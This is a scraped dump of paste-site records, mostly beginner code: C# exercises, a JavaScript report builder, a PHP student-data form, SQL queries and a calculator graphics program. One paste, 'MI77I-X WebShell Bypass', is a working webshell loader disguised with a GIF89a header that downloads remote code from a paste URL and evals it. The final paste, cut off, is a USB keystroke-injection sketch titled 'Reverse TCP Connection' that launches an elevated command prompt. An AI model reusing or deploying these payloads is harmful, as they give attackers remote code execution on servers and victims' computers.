kids.Enqueue(kid);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Removed {kid}"");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 curent = 0;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine($""Last is {kids.Dequeue()}"");\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 14:01:56 +00:00', hash_val='c40603729d473be6461eb00f94dedb74', url='/2nz8WBMX', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='dunyto', title='Create Report', content='function generateReport() {\n\xa0 \xa0 let cbs = document.querySelectorAll(""thead tr th input"");\n\xa0 \xa0 let colPos = [];\n\xa0 \xa0 for (let i = 0; i < cbs.length; i ++) {\n\xa0 \xa0 \xa0 \xa0 if (cbs[i].checked) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 colPos.push(i);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let finalResult = [];\n\xa0\n\xa0 \xa0 let data = document.querySelectorAll(""tbody tr"");\n\xa0 \xa0 for (let j = 0; j < data.length; j ++) {\n\xa0 \xa0 \xa0 \xa0 let currRow = data[j].children;\n\xa0 \xa0 \xa0 \xa0 let currItems = {};\n\xa0 \xa0 \xa0 \xa0 for (let k = 0; k < currRow.length; k ++) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (colPos.includes(k)) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let label = cbs[k].name;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currItems[label] = currRow[k].textContent;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 finalResult.push(currItems);\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 let jsonFinal = JSON.stringify(finalResult);\n\xa0 \xa0 let target = document.getElementById(\'output\');\n\xa0 \xa0 target.value = jsonFinal;\n}', date='2022-06-01 13:59:57 +00:00', hash_val='cf8530010b5f97ab0fca43fd8e6f8846', url='/XxXav8r9', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='sugab', title='Consume API Edit PHP', content='<?php\ninclude \'inc.php\';\n\xa0\nif (!empty($_POST[\'nim\'])) {\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $url = $api_url. \'?nim=\' . $nim;;\n\xa0\n\xa0 $postdata = array();\n\xa0 $postdata[\'nama\'] = $_POST[\'nama\'];\n\xa0 $postdata[\'angkatan\'] = $_POST[\'angkatan\'];\n\xa0 $postdata[\'semester\'] = $_POST[\'semester\'];\n\xa0 $postdata[\'ipk\'] = $_POST[\'ipk\'];\n\xa0 $postdata[\'email\'] = $_POST[\'email\'];\n\xa0 $postdata[\'telepon\'] = $_POST[\'telepon\'];\n\xa0 $json = json_encode($postdata);\n\xa0\n\xa0 $ch = curl_init();\n\xa0 curl_setopt($ch, CURLOPT_URL, $url);\n\xa0 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, ""PUT"");\n\xa0 curl_setopt($ch, CURLOPT_HTTPHEADER, array(\'Content-Type: appplication/json\'));\n\xa0 curl_setopt($ch, CURLOPT_POSTFIELDS, $json);\n\xa0 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n\xa0\n\xa0 $response = curl_exec($ch);\n\xa0 curl_close($ch);\n\xa0\n\xa0 header(\'location:index.php\');\n\xa0 exit();\n}\n?>\n\xa0\n<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"">\n<html>\n\xa0\n<head>\n\xa0 <!-- BOOTSTRAP -->\n\xa0 <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"" integrity=""sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS"" crossorigin=""anonymous"">\n\xa0 <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"" integrity=""sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://code.jquery.com/jquery-3.3.1.slim.min.js"" integrity=""sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"" crossorigin=""anonymous""></script>\n\xa0 <script src=""https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"" integrity=""sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut"" crossorigin=""anonymous""></script>\n\xa0 <title>Data Mahasiswa Politeknik</title>\n</head>\n\xa0\n<body>\n\xa0 <nav class=""navbar navbar-expand-lg navbar-light bg-light justify-content-between"">\n\xa0 \xa0 <a class=""navbar-brand"" href=""#"">\n\xa0 \xa0 \xa0 <img src=""img/logo.png"" width=""60"" height=""60"" alt="""">\n\xa0 \xa0 </a>\n\xa0 \xa0 <h1>Data Mahasiswa Politeknik</h1>\n\xa0 \xa0 <a href=""index.php"">\n\xa0 \xa0 \xa0 <button type=""button btn-lg"" class=""btn btn-success btn-sm"">Back</button>\n\xa0 \xa0 </a>\n\xa0 </nav>\n\xa0\n\xa0 <?php\n\xa0 $nim = intval($_GET[""nim""]);\n\xa0 $api_mahasiswa = $api_url . \'?nim=\' . $nim;\n\xa0 $json_detail = @file_get_contents($api_mahasiswa);\n\xa0 $arr_detail = json_decode($json_detail, true);\n\xa0 $result = isset($arr_detail[\'data\']) ? $arr_detail[\'data\'] : array();\n\xa0 $data = $result[0];\n\xa0 ?>\n\xa0 <div class=""col-4""></div>\n\xa0 <div class=""container col-4 my-3"">\n\xa0 \xa0 <h3>Edit Data Mahasiswa</h3>\n\xa0 \xa0 <form method=""POST"" action="""">\n\xa0 \xa0 \xa0 <input type=""hidden"" name=""nim"" value=""<?php echo $data[\'nim\']; ?>"" />\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>NIM</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nim"" class=""form-control"" value=""<?php echo $data[\'nim\']; ?>"" readonly>\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Nama</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""nama"" class=""form-control"" value=""<?php echo $data[\'nama\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Angkatan</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""angkatan"" class=""form-control"" value=""<?php echo $data[\'angkatan\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Semester</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""semester"" class=""form-control"" value=""<?php echo $data[\'semester\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>IPK</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""ipk"" class=""form-control"" value=""<?php echo $data[\'ipk\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Email</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""email"" class=""form-control"" value=""<?php echo $data[\'email\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div class=""form-group"">\n\xa0 \xa0 \xa0 \xa0 <label>Telepon</label>\n\xa0 \xa0 \xa0 \xa0 <input type=""text"" name=""telepon"" class=""form-control"" value=""<?php echo $data[\'telepon\']; ?>"">\n\xa0 \xa0 \xa0 </div>\n\xa0\n\xa0 \xa0 \xa0 <div>\n\xa0 \xa0 \xa0 \xa0 <button class=""btn btn-success"" name=""submit"" type=""submit"">Submit Data</button>\n\xa0 \xa0 \xa0 </div>\n\xa0 \xa0 </form>\n\xa0 </div>\n\xa0 <div class=""col-4""></div>\n\xa0\n</body>\n\xa0\n</html>', date='2022-06-01 13:53:01 +00:00', hash_val='e23a311fb08bb1d7fcb5bb826a8b4c1d', url='/sAgz7Jas', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="delete from objects\nwhere name = 'Томас Шелби'\n\xa0\nINSERT INTO objects VALUES (100, 50, 15, 'Томас Шелби')", date='2022-06-01 13:49:33 +00:00', hash_val='9e40e7a0737cf3168037aa88b0c67dc2', url='/6XtvDpbC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='willysec_id', title='MI77I-X WebShell Bypass', content="Gif89a\n<?php $c=&$cv;$cv='https://pastebin.com/raw/jePRQN8t';$b=file_get_contents($c);@eval('?>'.'/******/'.$b);", date='2022-06-01 13:37:58 +00:00', hash_val='ee758ec64e1ac541c32118c3b9c6585e', url='/S6BumVkC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. Computer Store', content='using System;\n\xa0\nnamespace _01._Computer_Store\n{\n\xa0 class Program\n\xa0 {\n\xa0 \xa0 static void Main (string[]args)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 string partPrice = Console.ReadLine ();\n\xa0 \xa0 \xa0 double currentPrice = 0;\n\xa0 \xa0 \xa0 double totalPrice = 0;\n\xa0 \xa0 \xa0 double discont = 0;\n\xa0 \xa0 \xa0 while (partPrice != ""regular"")\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 if (partPrice == ""special"")\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 discont = totalPrice * 0.12;\n\xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 currentPrice = double.Parse (partPrice);\n\xa0\n\xa0 \xa0 \xa0 if (currentPrice < 0)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine (""Invalid price!"");\n\xa0 \xa0 \xa0 \xa0 \xa0 currentPrice = 0;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 totalPrice += currentPrice;\n\xa0 \xa0 \xa0 partPrice = Console.ReadLine();\n\xa0\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 double priceWithTax = (totalPrice*1.2) - discont;\n\xa0 \xa0 \xa0 if (priceWithTax == 0)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Invalid order!"");\n\xa0 \xa0 }\n\xa0 \xa0 \xa0 else\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 Console.WriteLine (""Congratulations you\'ve just bought a new computer!"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Price without taxes: {totalPrice:f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Taxes: {(totalPrice*0.2):f2}$"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""-----------"");\n\xa0 \xa0 \xa0 Console.WriteLine ($""Total price: {priceWithTax:f2}$"");\n\xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 }\n}', date='2022-06-01 13:36:31 +00:00', hash_val='149c96076478eb86b5b2fb838662095a', url='/nFymAiMC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='vvsvvs', title='Untitled', content='using System;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Text;\n\xa0\nnamespace MealPlan\n{\n\xa0 \xa0 class Program\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 static void Main(string[] args)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Dictionary<string, int> mealsCalories = new Dictionary<string, int>\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""salad"", 350},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""soup"", 490},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""pasta"", 680},\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {""steak"", 790}\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Queue<string> keysQueue = new Queue<string>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries));\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Stack<int> valuesStack = new Stack<int>(Console.ReadLine().Split(\' \', StringSplitOptions.RemoveEmptyEntries).Select(int.Parse));\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int startMealsCount = keysQueue.Count; \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 while ((keysQueue.Count > 0) && (valuesStack.Count > 0))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentCallories = valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 int currentMealCallories = mealsCalories[keysQueue.Peek()];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories - currentMealCallories >= 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories); \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories -= currentMealCallories;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 currentCallories += valuesStack.Pop();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (currentCallories > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 valuesStack.Push(currentCallories);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 keysQueue.Dequeue();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 StringBuilder sb = new StringBuilder();\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (valuesStack.Count > 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John had {startMealsCount} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""For the next few days, he can eat {string.Join("", "", valuesStack)} calories."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""John ate enough, he had {startMealsCount - keysQueue.Count} meals."");\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 sb.AppendLine($""Meals left: {string.Join("", "", keysQueue)}."");\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 Console.WriteLine(sb.ToString().TrimEnd());\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n}', date='2022-06-01 13:34:37 +00:00', hash_val='e816c4ce3fd5316828944cfe846e46d2', url='/CFxHbqkU', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="select \xa0name as exercise6\nfrom objects\nwhere level = 2 START WITH objects.name = 'Баришов Максим' \xa0\nCONNECT by prior objects.parent_id = object_id", date='2022-06-01 13:26:54 +00:00', hash_val='24dd6cc9c81ed1b0d571ac896b18fd38', url='/vAC6sJ5X', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='rafalou38', title='Untitled', content='#include <ti/getcsc.h>\n#include <sys/util.h>\n#include <graphx.h>\n#include <keypadc.h>\n\xa0\n#define width GFX_LCD_WIDTH\n#define height GFX_LCD_HEIGHT\n\xa0\n#define MUTATION_RATE 10\n\xa0\nint main(void)\n{\n\xa0\n\xa0 \xa0 uint32_t targetColor, pixelColor;\n\xa0 \xa0 int x, y, i, j, oi, oj;\n\xa0 \xa0 int newR, newG, newB;\n\xa0 \xa0 uint32_t grid[width][height];\n\xa0\n\xa0 \xa0 for (i = 0; i < width; i++)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 for (j = 0; j < height; j++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 grid[i][j] = 0x000000;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* Initialize graphics drawing */\n\xa0 \xa0 gfx_Begin();\n\xa0\n\xa0 \xa0 grid[width / 2][height / 2] = 0xff6464;\n\xa0\n\xa0 \xa0 gfx_FillScreen(gfx_RGBTo1555(0, 0, 0));\n\xa0\n\xa0 \xa0 i = 0;\n\xa0 \xa0 while (true)\n\xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 //\n\xa0 \xa0 \xa0 \xa0 if (kb_IsDown(kb_Annul))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0\n\xa0 \xa0 \xa0 \xa0 for (x = 0; x < width; x++)\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (y = 0; y < height; y++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // current pixel color on the old grid\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 pixelColor = grid[x][y];\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (pixelColor == 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oi = x - 1; oi <= x + 1; oi++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 i = (oi + height) % height;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (oj = y - 1; oj <= y + 1; oj++)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 {\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // wrap j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 j = (oj + width) % width;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 targetColor = grid[i][j];\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // // if next cell is full ignore + randomness\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if (targetColor != 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 continue;\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // mutate the new color\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newR = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newG = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newB = randInt(0, 255);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0\n\xa0 \xa0 // /* End graphics drawing */\n\xa0 \xa0 gfx_End();\n\xa0\n\xa0 \xa0 return 0;\n}', date='2022-06-01 13:16:03 +00:00', hash_val='36b774247537106529f46b882c13b56a', url='/EbtiverJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Farliam', title='Reverse TCP Connection', content='#include ""GermanLayout.h""\n\xa0\n#define KEY_TAB 0x2b\n\xa0\nvoid setup() {\n\xa0 \xa0 DigiKeyboard.delay(500);\n\xa0 \xa0 pinMode(1, OUTPUT);\n}\n\xa0\nvoid StartAdminCMD(){\n\xa0 DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);\n\xa0 DigiKeyboard.delay(500);\n\xa0 DigiKeyboardDe.println(""powershell \xa0Start-Process cmd -Verb runAs"");\n\xa0 DigiKeyboard.delay(1500);\n\xa0 